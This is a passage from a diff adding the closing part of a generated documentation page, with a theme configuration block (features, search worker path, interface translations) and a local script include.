+      <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.annotate", "content.code.copy", "content.tabs.link", "header.autohide", "announce.dismiss", "navigation.footer", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.c8b220af.min.js"></script>
+      
+    
+  </body>
+</html>
